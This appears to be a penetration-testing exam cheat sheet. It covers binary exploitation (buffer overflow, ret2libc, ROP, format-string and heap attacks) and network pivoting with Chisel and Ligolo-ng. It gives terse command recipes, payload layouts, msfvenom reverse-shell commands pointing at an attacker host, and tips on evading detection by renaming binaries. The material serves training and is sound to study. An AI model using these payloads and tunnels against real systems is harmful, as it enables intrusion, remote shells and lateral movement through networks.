name: Argha Dey Binary Exploitation Methodology
description: Complete A-to-Z guide: static analysis (file, strings, readelf, checksec, radare2, Ghidra) → dynamic analysis (strace, ltrace, GDB with GEF/PEDA/pwndbg) → exploitation (BOF → ret2libc → ROP → format string → heap). Includes full worked example and exam playbook.
examHabits: Always run checksec --file=binary first - answers almost every protection question in one shot
Run the exact sequence: file → checksec → strings|grep flag/bin/pass → gdb break main → info proc mappings → find/ROPgadget
For address-of questions: use GDB breakpoints + info proc mappings to compute runtime addresses
For ret2libc offset: p system; find /bin/sh; p/x addr_binsh - addr_system (constant regardless of ASLR)
If ASLR is on: leak via GOT (puts@plt puts@got + main loop), then compute libc base
Understand manual compilation path, not just Metasploit - CPENT often doesn't provide Metasploit access
Always verify kernel/software version and patch level before kernel exploits - they can crash the target
quickRef: checksec --file=./binary | ROPgadget --binary ./binary --only 'pop|ret' | python3 -c 'from pwn import *; ...' | gdb -q ./binary

decisionPoints.action: file ./binary (arch, bits, static/dynamic, stripped, PIE); checksec --file=./binary (RELRO, Canary, NX, PIE, RPATH, RUNPATH)
decisionPoints.fallback: Manual: readelf -h (Type: EXEC=No PIE, DYN=PIE); readelf -l | grep GNU_STACK (E flag=NX off); readelf -d | grep BIND_NOW (Full RELRO)

decisionPoints.condition: Need runtime info without debug symbols
decisionPoints.action: strings -t x ./binary | grep -i 'flag|pass|/bin/sh'; readelf -h | grep 'Entry point'; readelf -l | grep program headers
decisionPoints.fallback: nm ./binary | grep ' T ' (defined functions); objdump -R ./binary (dynamic relocations)

decisionPoints.action: python3 -c 'from pwn import *; print(cyclic(300).decode())' > /tmp/pattern; gdb: run < /tmp/pattern; i r eip (shows 0x62616161)
decisionPoints.fallback: pwn cyclic -l 0x61616166 (instant offset); or msf-pattern_create -l 200 + msf-pattern_offset -q <eip_value>

decisionPoints.action: Find JMP ESP: objdump -d libc.so.6 | grep -B2 'jmp.*esp'; ROPgadget --binary ./binary --only 'jmp|call' | grep esp. Build payload: A*offset + jmp_esp + NOP sled + shellcode
decisionPoints.fallback: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\x00\x0a\x0d'

decisionPoints.action: gdb-peda: p system; find /bin/sh; p/x addr_binsh - addr_system (constant offset). Payload: A*offset + system_addr + exit_addr + binsh_addr
decisionPoints.fallback: For x86_64: need pop rdi; ret gadget to set RDI register before calling system

decisionPoints.action: ROPgadget --binary ./binary --only 'pop|ret'; ROPgadget --binary ./binary --only 'pop rdi|ret' (x64 arg gadget); ropper --file ./binary --search 'pop rdi'
decisionPoints.fallback: ROPgadget --binary ./binary --string '/bin/sh' (find embedded string)

decisionPoints.condition: ASLR on - need info leak chain
decisionPoints.action: Stage 1: leak puts() via GOT: payload = A*offset + pop_rdi + puts_got + puts_plt + main_addr; Stage 2: libc.address = leaked - libc.symbols['puts']; call system(binsh)
decisionPoints.fallback: one_gadget ./libc.so.6 for single-instruction win (satisfy register constraints)

steps.phase: Stage 5 - GOT Overwrite (Partial/No RELRO + Format String)

decisionPoints.action: Confirm: ./binary '%x %x %x'; find offset where input appears; Leak: p.sendline(b'%7$s'); Arbitrary write: fmtstr_payload(offset, {target_got: new_value})
decisionPoints.fallback: Use pwntools fmtstr_payload(6, {elf.got['exit']: elf.symbols['win_function']})

decisionPoints.action: Step 1: ./binary 'AAAA.%x.%x.%x' find which %N$x shows 41414141; Step 2: leak memory ./binary '%7$s'; Step 3: arbitrary write with %n: fmtstr_payload(6, {got_target: value})
decisionPoints.fallback: Use pwntools fmtstr_payload with payload dictionary to automate offset + write

decisionPoints.condition: Heap vulnerability suspected (UAF, double free, tcache/fastbin)
decisionPoints.action: gdb: gef> heap chunks; gef> heap bins; pwndbg> heap; pwndbg> bins; pwndbg> tcache
decisionPoints.fallback: Concepts: UAF=use-after-free pointer reuse; Tcache poisoning=overwrite fd of freed chunk; Fastbin attack=fastbin freelist; House of Force=corrupt top chunk

decisionPoints.action: Use SigreturnFrame from pwntools to set rax=0, rdi=1, etc., then find a sigreturn gadget
decisionPoints.fallback: ret2csu: use __libc_csu_init gadgets (pop rbx; pop rbp; pop r12-r15; ret) for multi-register control

decisionPoints.action: Negative signed value bypasses (int)len < MAX_SIZE check, but used as unsigned in memcpy/malloc
decisionPoints.fallback: Send -1 where unsigned wraps to huge value

decisionPoints.action: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\x00\x0a\x0d'
decisionPoints.fallback: Manual: nasm -f elf32 shellcode.asm -o shellcode.o; objcopy -O binary -j .text shellcode.o shellcode.bin; xxd -i shellcode.bin

decisionPoints.action: context.arch='amd64'; elf=ELF('./binary'); libc=ELF('./libc.so.6'); p=remote('target',port) or process; p.sendline/p.recvline/p.recvuntil/p.sendafter; p.interactive()
decisionPoints.fallback: Helpers: p64/p32 pack; u64/u32 unpack; cyclic/cyclic_find; elf.symbols['main'], elf.got['puts'], elf.plt['puts']; fmtstr_payload(offset, {target: value})

name: Argha Dey Pivoting & Tunneling Methodology
description: Chisel A-Z (server/client setup, local port forwarding, multi-pivot chaining) and Ligolo-ng A-Z (TUN interface, proxy/agent architecture, CLI + GUI/WebUI, multi-pivot). Includes comparison table and exam tips.
examHabits: Always confirm dual-homed hosts first - run ifconfig/ip a on every pivot to find the second network leg
Use -sT (TCP connect scan), never -sS (SYN) through Ligolo-ng's TUN or proxychains - raw/SYN scans don't traverse tunnels
Always use -Pn with nmap when pivoting - ICMP echo often doesn't traverse the tunnel/SOCKS proxy
Document each pivot hop - IP addresses, tool used, command run, screenshot routing table (ip route) and session list
If Chisel is blocked/detected: prefer Ligolo-ng or rename/obfuscate binaries, fall back to native SSH -R/-D or plink.exe
Clean up: kill agents (agent_kill), remove routes (route_del), delete tun interfaces (interface_delete), stop chisel processes
When double/triple pivoting: create a NEW distinct tun interface name per hop (ligolo, ligolo-double, ligolo-triple) to avoid route collisions
If only ONE service needed (RDP/SMB): Chisel local/remote port-forward is faster than full Ligolo tunnel
If enumerating/attacking MANY hosts across a subnet: Ligolo-ng is faster and less error-prone than proxychains + Chisel
quickRef: CHISEL: chisel server -p 8000 --reverse (attacker); ./chisel client <kali>:8000 R:socks (pivot); proxychains nmap -sT -Pn 172.16.1.0/24 | LIGOLO: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ./proxy -selfcert -laddr 0.0.0.0:11601; ./agent -connect <kali>:11601 -ignore-cert; route_add + tunnel_start

decisionPoints.action: Pivoting = strategy (using compromised host to reach internal network); Tunneling = mechanism (encapsulated channel over HTTP/HTTPS/SSH/DNS to bypass firewalls/ACLs)
decisionPoints.fallback: Port forwarding = specific technique of tunneling (local: ssh -L; remote: ssh -R; dynamic SOCKS: ssh -D)

decisionPoints.action: Single: Attacker → Pivot1 → Network A. Double: Attacker → Pivot1 → Pivot2 → Network B. Multi: N hops chained
decisionPoints.fallback: Identify by counting network segments between attacker and final target

decisionPoints.action: Attacker: chisel server -p 8000 --reverse. Pivot: ./chisel client <kali-ip>:8000 R:socks. Configure proxychains: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf. proxychains nmap -sT -Pn <internal-range>
decisionPoints.fallback: If proxychains breaks tools: use Chisel local forward R:3389:172.16.1.20:3389 then connect directly

decisionPoints.action: On Pivot1: run second chisel server --reverse --socks5 listening on internal iface; on Pivot2: connect to Pivot1 with R:socks; on attacker: chain proxychains config with two SOCKS entries (port 1080 for 172.16.x, port 1081 for 192.168.50.x)
decisionPoints.fallback: Option A recommended: chisel server -p 9000 --reverse --socks5 on Pivot1; ./chisel client 172.16.1.10:9000 R:socks on Pivot2; relay up via ./chisel client <kali>:8000 R:socks R:1081:127.0.0.1:1080

decisionPoints.action: Add --auth user:pass; --tls-skip-verify; --fingerprint <hash> to verify server cert (prevents MITM); --keepalive 25s to survive idle firewalls
decisionPoints.fallback: Standard: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf

decisionPoints.action: 1. sudo ip tuntap add user $(whoami) mode tun ligolo + sudo ip link set ligolo up (or interface_create --name ligolo in proxy CLI). 2. sudo ./proxy -selfcert -laddr 0.0.0.0:11601. 3. ./agent -connect <kali>:11601 -ignore-cert (or -accept-fingerprint <HASH>). 4. session → ifconfig → route_add --route 172.16.1.0/24 → tunnel_start --tun ligolo
decisionPoints.fallback: Use autoroute to auto-detect all agent routes

decisionPoints.action: After tunnel_start: nmap -sT -Pn 172.16.1.0/24; smbclient, evil-winrm, xfreerdp all work directly (no proxychains)
decisionPoints.fallback: 240.0.0.1 maps to pivot's 127.0.0.1 loopback services (curl http://240.0.0.1:8080)

decisionPoints.condition: Reverse shell / file transfer through tunnel
decisionPoints.action: [Agent] listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp; listener_list. Binds port 4444 on pivot, relays inbound to attacker through tunnel
decisionPoints.fallback: For meterpreter: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivot-ip> LPORT=4444 -f exe -o shell.exe; handler with LHOST=0.0.0.0 LPORT=4444

decisionPoints.action: 1. Single pivot to Pivot1 up (route to 172.16.1.0/24). 2. Create 2nd TUN: sudo ip tuntap add user $(whoami) mode tun ligolo-double. 3. [Agent:pivot1] listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (relay new agents back). 4. ./agent -connect 172.16.1.10:11601 -ignore-cert on Pivot2. 5. session 2 → ifconfig → route_add --name ligolo-double --route 192.168.50.0/24 → tunnel_start --tun ligolo-double
decisionPoints.fallback: Triple pivot: repeat with ligolo-triple TUN, listener on Pivot2 forwarding to Pivot3

decisionPoints.action: sudo ./proxy -selfcert -webui (WebUI at http://localhost:8080); optional -webui-addr 0.0.0.0:9090. GUI mirrors CLI: agent visualization, topology map, route/tunnel/listener management
decisionPoints.fallback: Config file (config.yaml) to auto-start proxy+webui+preset routes/listeners: ./proxy -config config.yaml

decisionPoints.action: Chisel: HTTP/SSH tunnel + SOCKS5 proxy, needs proxychains, manual multi-pivot chaining. Ligolo-ng: TUN interface + gVisor, NO proxychains needed, native transparent multi-pivot via listener_add, has WebUI
decisionPoints.fallback: Chisel for quick single-hop; Ligolo-ng for full subnet enumeration and multi-pivot

decisionPoints.action: Ligolo: tunnel_list; tunnel_stop; route_list; route_del --name ligolo --route 172.16.1.0/24; listener_list; listener_stop <ID>; interface_delete --name 'ligolo-double'; agent_kill; kill. Chisel: kill chisel processes on both attacker and pivot
decisionPoints.fallback: Document each hop with: IP addresses, tool used, command run, screenshot of ip route and session list

decisionPoints.fallback: macOS: sudo ifconfig utun4 alias 172.16.1.99 255.255.255.0; sudo route add -net 172.16.1.0/24 -interface utun4 (use utunX not ligolo)
